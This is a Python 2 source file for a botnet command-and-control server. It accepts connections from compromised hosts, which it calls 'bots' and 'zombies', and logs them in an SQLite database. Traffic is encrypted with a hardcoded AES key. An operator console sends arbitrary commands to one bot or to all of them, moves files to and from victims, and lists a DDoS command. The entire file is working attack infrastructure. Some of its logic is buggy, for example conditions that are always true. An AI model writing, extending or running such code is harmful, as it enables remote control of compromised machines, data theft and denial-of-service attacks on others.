import time
import socket
import base64
import sqlite3
import threading
from Queue import Queue
from termcolor import colored
from Crypto.Cipher import AES


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2, ]
queue = Queue()

all_connections = []
all_addresses = []

BS = 32

sock = socket.socket()


class ConnectionHandler:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 44353

    def socket_bind(self):
        try:
            sock.bind((self.host, self.port))
            sock.listen(1000)
        except socket.error as error:
            print "[!]Error: " + str(error)
            time.sleep(5)
            self.socket_bind()

    def register(self, ip):
        try:
            con = sqlite3.connect('bots.db')
            cur = con.cursor()
            cur.execute("INSERT OR IGNORE INTO bot_info (ip) VALUES (?);",  ((str(ip)), ))
            con.commit()
            con.close()
        except sqlite3.Error, e:
            print e
            print "\n[-]SQLError while adding Bot %s to Database!" %(ip)

    def accept_connections(self):
        for c in all_connections:
            c.close()
        del all_connections[:]
        del all_addresses[:]
        while True:
            try:
                conn, address = sock.accept()
                conn.setblocking(1)
                all_connections.append(conn)
                all_addresses.append(address[0])
                self.register(str(address[0]))
            except socket.error:
                print '[!]Error while accepting Connection!'


class FileHandler:
    def __init__(self):
        self.key = '{\xb9\xfed\xfc\x83\xcf\x1a:\xbe\xa7%\x0c\xa3\x88\xa8N\x7f\x89\xcd\xdf\x81\xb7\x98\xf8\x87\xdf\xab\xc5]}\xb8'

    def upload(self, filename, conn):
        f = open(filename, 'rb')
        l = f.read()
        print l
        Console().send(l, conn)
        print 'Sent ', repr(l)
        f.close()
        return None

    def download(self, filename, conn):
        with open(filename, 'wb') as f:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                data = Encrypt().decrypt(data, self.key)
                f.write(data)
        return None


class Encrypt:
    def encrypt(self, key, raw):
        pad = lambda x: x + (BS - len(x) % BS) * chr(BS - len(x) % BS)
        raw = pad(raw)
        iv = "q9%*LJZs<5:f]ngq"
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, key, enc):
        unpad = lambda x: x[0:-ord(x[-1])]
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(enc[16:]))


class Console:
    def __init__(self):
        self.key = '{\xb9\xfed\xfc\x83\xcf\x1a:\xbe\xa7%\x0c\xa3\x88\xa8N\x7f\x89\xcd\xdf\x81\xb7\x98\xf8\x87\xdf\xab\xc5]}\xb8'

    def usage(self):
        usage = "\n\thelp\t\t\t\t\tShows this message\n\tlist\t\t\t\t\tLists all registered Bots\n\tselect <id>\t\t\t\tSelect a Bot by ID for single session\n\tddos <target> <type>\tDDoS target specified\n"
        return usage

    def list_connections(self):
        con = sqlite3.connect('bots.db')
        cur = con.cursor()
        cur.execute("SELECT * FROM bot_info")
        bot_info = cur.fetchall()
        print "\n ID  |   ADDRESS   | STATUS \n"
        for row in bot_info:
            if row[1] in all_addresses:
                status = colored("ONLINE", "green")
                print " [%i]   %s   [%s]" % (row[0], row[1], status)
            else:
                status = colored("OFFLINE", "red")
                print " [%i]   %s   [%s]" % (row[0], row[1], status)
        print "\n"

    def get_target(self, cmd):
        try:
            target = cmd.replace('select', '')
            target = int(target)
            con = sqlite3.connect('bots.db')
            cur = con.cursor()
            cur.execute("SELECT ip FROM bot_info WHERE id = ?", (target, ))
            ip = cur.fetchall()
            ip = str(ip[0]).translate(None, "(u',)")
            target_location = all_addresses.index(str(ip))
            conn = all_connections[target_location]
            print "Connected to Bot: %s!" % (str(ip))
            con.close()
            return conn
        except:
            print "[!]Error: Invalid selection!"
            return None

    def send(self, data, conn):
        data = Encrypt().encrypt(self.key, data)
        try:
            conn.send(data)
            return None
        except socket.error:
            print "[-]Error while sending command to Bot!"

    def receive(self, conn):
        try:
            data = conn.recv(2048)
            data = Encrypt().decrypt(self.key, str(data))
            return str(data)
        except socket.error:
            print "[-]Error while receiving data from Bot!"

    def send_target_commands(self, conn):
        while True:
            try:
                cmd = raw_input(":: ")
                cmd = cmd.split(" ")
                if cmd[0] == 'quit':
                    conn.close()
                    self.shell()
                if cmd[0] == 'upload':
                    print cmd
                    if len(cmd[1]) > 0:
                        cmd = " ".join(cmd)
                        self.send(cmd, conn)
                        cmd = cmd.split(" ")
                        FileHandler().upload(str(cmd[1]), conn)
                        print "Uploaded File!\n"
                    else:
                        print self.usage()
                if cmd[0] == 'download':
                    if len(cmd[1]) > 0:
                        cmd = " ".join(cmd)
                        self.send(cmd, conn)
                        cmd = cmd.split(" ")
                        FileHandler().download(cmd[1], conn)
                        print "Downloaded File!\n"
                    else:
                        print self.usage()
                if cmd[0] == "start" or "Start":
                    cmd = " ".join(cmd)
                    self.send(cmd, conn)
                if len(cmd[0]) > 0:
                    cmd = " ".join(cmd)
                    self.send(cmd, conn)
                    response = self.receive(conn)
                    print response
                else:
                    print "[!]Error: Connection was lost!"
                    break
            except socket.error as error:
                print "[!]Error: " + str(error)
                self.shell()

    def shell(self):
        while True:
            cmd = raw_input(":: ")
            if cmd == 'list':
                self.list_connections()
            elif cmd == 'help':
                print self.usage()
            elif 'select' in cmd:
                conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(conn)
            else:
                if cmd == 'exit':
                    for c in all_connections:
                        self.send('exit', c)
                    exit()
                else:
                    choice = raw_input("Send Command to all Zombies?[y/n]:: ")
                    if choice == 'y' or 'Y':
                        for c in all_connections:
                            self.send(cmd, c)
                            print "Sent Command!\n"
                    else:
                        pass


class ThreadHandler:
    def stop(self, thread_num):
        threading.thread.exit()

    def add_to_threads(self, target, args):
        t = threading.Thread(target=target, args=args)
        t.daemon = True
        print "started thread"
        t.start()

    def create_workers(self):
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = queue.get()
            if x == 1:
                ConnectionHandler().socket_bind()
                ConnectionHandler().accept_connections()
            if x == 2:
                Console().shell()
            queue.task_done()

    def create_jobs(self):
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()

    def run(self):
        self.create_workers()
        self.create_jobs()


def create_db():
    con = sqlite3.connect('bots.db')
    cur = con.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS bot_info (id integer primary key autoincrement unique, ip text)")
    con.commit()
    con.close()
create_db()


if __name__ == '__main__':
    ThreadHandler().run()